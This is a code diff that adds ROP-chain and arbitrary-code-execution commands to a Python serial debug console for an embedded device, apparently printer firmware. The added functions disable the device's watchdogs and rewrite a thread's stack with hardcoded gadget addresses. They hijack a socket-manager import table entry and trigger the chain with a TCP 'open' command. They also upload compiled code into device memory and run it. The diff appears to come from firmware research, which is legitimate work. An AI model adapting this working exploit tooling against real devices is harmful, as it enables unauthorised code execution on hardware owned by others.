@@ -1,8 +1,15 @@
 import importlib
 import inspect
+import os
 import struct
 import pkgutil
+import subprocess
+
 import serial
+from PyRop.builder_base import *
+from PyRop.base_modules import *
+import socket
+import shutil
 from hexdump import hexdump
 
 PORT = "COM3"
@@ -11,9 +18,20 @@ BLOCK_SIZE = 64
 PLANE_SIZE = 1024
 sm_ModuleTaskThreads = 0xC3E17120
 
+ROP_PATH = "ropChains"
+CODE_PATH = "code"
+CODE_BUILD_PATH = "code_build"
+SCRATCH_SIZE = 1024 * 10
+DATA_SIZE = 1024 * 4
+STACK_SIZE = 1024 * 4
+LINK_TEXT_ADDRESS = 0x409A1330
+LINK_TEXT_SIZE = 0x400
+
 ser = serial.Serial(PORT, 115200)
 tasks = {}
 structs = {}
+scratchAddress = 0
+dataAddress = 0
 
 
 def getClassFromModule(m):
@@ -190,8 +208,8 @@ def mem_write(addr, data):
     while True:
         if offset == len(data):
             break
-        dword = struct.unpack(">I", data[offset:offset+4])[0]
-        mem_write_dword(addr+offset, dword)
+        dword = struct.unpack(">I", data[offset:offset + 4])[0]
+        mem_write_dword(addr + offset, dword)
         offset += 4
 
 
@@ -401,6 +419,279 @@ def eval_command(args):
         print(f"Exception: {exc}")
 
 
+def rop_help():
+    print("rop list - Lists available RopChains")
+    print("rop build [chainName] - Builds a RopChain and hexdumps it")
+    print("rop run [chainName] - Builds a RopChain and runs it")
+
+
+def build_rop(name, directory):
+    chainPath = os.path.join(directory, name)
+    if not os.path.exists(chainPath):
+        print(f"{chainPath} does not exist!")
+        return
+
+    builder = BasicBuilder.create(name, IncludeModule, AreaModule, LabelModule, PopModule)
+    builder.build(chainPath)
+    return bytes(builder.chain)
+
+
+def rop_run(name, path):
+    print("Setting tGGW priorities and thresholds so our RopChain doesn't preempt...")
+    ggwThread = tasks["tGGW"]
+    mem_write_dword(ggwThread + 0x38, 0)  # priority
+    mem_write_dword(ggwThread + 0x48, 0)  # preempt_threshold
+    mem_write_dword(ggwThread + 0xC0, 0)  # user_priority
+    mem_write_dword(ggwThread + 0xC4, 0)  # user_preempt_threshold
+
+    print("Disabling hw_watchdog")
+    runUnderware("hw.wdog_disable")
+    runUnderware("udw.wdog_disable")
+    runUnderware("wdog.disable")
+
+    ggw_ImportTable = 0xC36716DC
+    COMP_IO_SOCKET_MGR_Import = 0xC
+    ggw_StackStart = 0xc4ec7fa4
+    ropChainStart = ggw_StackStart + 0x10
+    ROP_POP_PC = 0x409FE8FB
+    ROP_POP_R4_PC = 0x403196C7
+    ROP_MOV_SP_R4_POP_R4_R5_R6_PC = 0x40089408
+    stackPtrAfterChannelOpen = 0xc4eca118
+
+    print("Creating fake export table and mini chain")
+    mem_write_dword(ggw_StackStart, ggw_StackStart + 4)
+
+    # First export, called when sending ggw OPEN command
+    mem_write_dword(ggw_StackStart + 4, ROP_POP_R4_PC)
+
+    mem_write_dword(stackPtrAfterChannelOpen, ropChainStart)  # R4=ropChainStart
+    mem_write_dword(stackPtrAfterChannelOpen + 4, ROP_MOV_SP_R4_POP_R4_R5_R6_PC)  # SP=R4 (ropChainStart)
+    mem_write_dword(ropChainStart, 0xDEADBEEF)  # R4
+    mem_write_dword(ropChainStart + 0x4, 0xDEADBEEF)  # R5
+    mem_write_dword(ropChainStart + 0x8, 0xDEADBEEF)  # R6
+    mem_write_dword(ropChainStart + 0xC, ROP_POP_PC)  # PC
+
+    print("Building RopChain and writing it into ggw's stack")
+    ropChain = build_rop(name, path)
+    mem_write(ropChainStart + 0x10, ropChain)
+
+    print("Pointing the COMP_IO_SOCKET_MGR import to our fake export")
+    mem_write_dword(ggw_ImportTable + COMP_IO_SOCKET_MGR_Import, ggw_StackStart)
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(("192.168.178.30", 9220))
+    s.send(b"open 9\r\n")
+    s.close()
+
+    print("Triggered by sending open command!")
+
+
+def rop_command(args):
+    if len(args) == 0:
+        rop_help()
+        return
+
+    if len(args) == 1 and args[0] == "list":
+        chains = [f for f in os.listdir(ROP_PATH) if os.path.isfile(os.path.join(ROP_PATH, f))]
+        print("Available chains:")
+        for chain in chains:
+            print(chain)
+    elif len(args) == 2:
+        if args[0] == "build":
+            hexdump(build_rop(args[1], ROP_PATH))
+        elif args[0] == "run":
+            rop_run(args[1], ROP_PATH)
+            print("Printing every serial line from now on:")
+            print()
+
+            while True:
+                line = ser.readline().decode("utf-8")[:-1]
+                if line.startswith("END"):
+                    break
+                print(line)
+
+            print()
+            print("RopChain finished!")
+        else:
+            rop_help()
+    else:
+        rop_help()
+
+
+def zeroExtendFile(path, alignment):
+    with open(path, "rb") as f:
+        data = f.read()
+
+    data_alignment = len(data) % alignment
+    if data_alignment == 0:
+        return data
+
+    extended = bytearray()
+    extended.extend(data)
+    extended.extend((alignment - data_alignment) * b"\x00")
+    return extended
+
+
+def code_help():
+    print(f"code list - Lists projects in \"{CODE_PATH}\"")
+    print("code run [name] - Builds and runs the specified project")
+
+
+def code_command(args):
+    global scratchAddress
+    global dataAddress
+
+    if len(args) == 0:
+        code_help()
+        return
+    if len(args) == 1 and args[0] == "list":
+        print("Available projects:")
+        codeList = [dir for dir in os.listdir(CODE_PATH) if os.path.isdir(os.path.join(CODE_PATH, dir))]
+        for code in codeList:
+            print(code)
+        pass
+    elif len(args) == 2 and args[0] == "run":
+        name = args[1]
+        codePath = os.path.join(CODE_PATH, name)
+        codeBuildPath = os.path.join(CODE_BUILD_PATH, name)
+
+        if not os.path.exists(codePath):
+            print(f"There's no \"{name}\" in \"{CODE_PATH}\"!")
+            return
+        if not os.path.exists(CODE_BUILD_PATH):
+            os.makedirs(CODE_BUILD_PATH)
+
+        with open(os.path.join(ROP_PATH, "CodeRun_Template"), "r") as f:
+            codeRunTemplate = f.readlines()
+
+        if scratchAddress == 0 and dataAddress == 0:
+            with open(os.path.join(ROP_PATH, "CodeMalloc_Template"), "r") as f:
+                codeMallocTemplate = f.readlines()
+
+            print("Replacing placeholders in CodeMalloc_Template RopChain")
+
+            for i in range(len(codeMallocTemplate)):
+                line = codeMallocTemplate[i]
+                line = line.replace("{SCRATCH_SIZE}", str(SCRATCH_SIZE))
+                line = line.replace("{DATA_SIZE}", str(DATA_SIZE))
+                codeMallocTemplate[i] = line
+
+            # Write CodeMalloc RopChain
+            codeMallocPath = os.path.join(ROP_PATH, "CodeMalloc")
+            with open(codeMallocPath, "w") as f:
+                f.writelines(codeMallocTemplate)
+
+            # Run the chain and parse the output
+            print("Running the generated CodeMalloc RopChain:")
+            print()
+            rop_run("CodeMalloc", ROP_PATH)
+            print()
+
+            while True:
+                line = ser.readline().decode("utf-8")
+                if ':' in line:
+                    scratchAddressStr, dataAddressStr = line.split(':')
+                    scratchAddress = int(scratchAddressStr, 16)
+                    dataAddress = int(dataAddressStr, 16)
+                    break
+
+            # Remove generated RopChain
+            os.remove(codeMallocPath)
+            print("Got allocated memory from the device:")
+        else:
+            print("Reusing previously allocated memory from the device:")
+
+        print(f"scratchAddress: {hex(scratchAddress)}")
+        print(f"dataAddress: {hex(dataAddress)}")
+
+        # Copy code dir to build dir
+        shutil.rmtree(codeBuildPath, ignore_errors=True)
+        shutil.copytree(codePath, codeBuildPath)
+
+        crtPath = os.path.join(codeBuildPath, "src/crt0.S")
+        linkPath = os.path.join(codeBuildPath, "link.ld")
+
+        print(f"Replacing placeholders in {crtPath}")
+        with open(crtPath, "r") as f:
+            crt = f.readlines()
+        for i in range(len(crt)):
+            line = crt[i]
+            line = line.replace("{STACK_SIZE}", str(STACK_SIZE))
+            crt[i] = line
+        with open(crtPath, "w") as f:
+            f.writelines(crt)
+
+        print(f"Replacing placeholders in {linkPath}")
+        with open(linkPath, "r") as f:
+            link = f.readlines()
+        for i in range(len(link)):
+            line = link[i]
+            line = line.replace("{TEXT_ADDRESS}", hex(LINK_TEXT_ADDRESS))
+            line = line.replace("{TEXT_SIZE}", hex(LINK_TEXT_SIZE))
+            line = line.replace("{DATA_ADDRESS}", hex(dataAddress))
+            line = line.replace("{DATA_SIZE}", hex(DATA_SIZE))
+            link[i] = line
+        with open(linkPath, "w") as f:
+            f.writelines(link)
+
+        print("Building...")
+        print(subprocess.check_output(["bash", "-c", "make"], cwd=codeBuildPath).decode("utf-8"))
+
+        textPath = os.path.join(codeBuildPath, f"build/{name}_text_rodata.bin")
+        dataPath = os.path.join(codeBuildPath, f"build/{name}_data.bin")
+        if not os.path.exists(textPath) or not os.path.exists(dataPath):
+            print("Build failed...")
+            return
+
+        textBytes = zeroExtendFile(textPath, 4)
+        textSize = len(textBytes)
+        dataBytes = zeroExtendFile(dataPath, 4)
+        dataSize = len(dataBytes)
+
+        scratchTextAddress = scratchAddress
+        print(f"Writing .text and .rodata ({hex(textSize)} bytes) to scratch: {hex(scratchTextAddress)}")
+        mem_write(scratchTextAddress, textBytes)
+
+        scratchDataAddress = scratchAddress + textSize
+        print(f"Writing .data ({hex(dataSize)} bytes) to scratch: {hex(scratchDataAddress)}")
+        mem_write(scratchDataAddress, dataBytes)
+
+        print("Replacing placeholders in CodeRun_Template RopChain")
+        for i in range(len(codeRunTemplate)):
+            line = codeRunTemplate[i]
+            line = line.replace("{TEXT_ADDRESS}", hex(LINK_TEXT_ADDRESS))
+            line = line.replace("{SCRATCH_TEXT_ADDRESS}", hex(scratchTextAddress))
+            line = line.replace("{TEXT_SIZE}", hex(textSize))
+            line = line.replace("{DATA_ADDRESS}", hex(dataAddress))
+            line = line.replace("{SCRATCH_DATA_ADDRESS}", hex(scratchDataAddress))
+            line = line.replace("{DATA_SIZE}", hex(dataSize))
+            line = line.replace("{STACK_SIZE}", hex(STACK_SIZE))
+            codeRunTemplate[i] = line
+
+        # Write CodeRun RopChain
+        codeRunPath = os.path.join(ROP_PATH, "CodeRun")
+        with open(codeRunPath, "w") as f:
+            f.writelines(codeRunTemplate)
+
+        # Run the chain and parse the output
+        print("Running the generated CodeRun RopChain:")
+        print()
+        rop_run("CodeRun", ROP_PATH)
+        print()
+
+        # Remove generated RopChain
+        os.remove(codeRunPath)
+
+        print("Printing every serial line from now on:")
+        while True:
+            line = ser.readline().decode("utf-8")[:-1]
+            if line.startswith("END"):
+                break
+            print(line)
+    else:
+        code_help()
+
+
 def print_help():
     print("Available commands:")
     print("! [s] - Run shell command")
@@ -412,6 +703,8 @@ def print_help():
     task_help()
     struct_help()
     eval_help()
+    rop_help()
+    code_help()
 
 
 commands = {
@@ -420,7 +713,9 @@ commands = {
     "mem": mem_command,
     "task": task_command,
     "struct": struct_command,
-    "eval": eval_command
+    "eval": eval_command,
+    "rop": rop_command,
+    "code": code_command
 }
 print_help()
 while True:
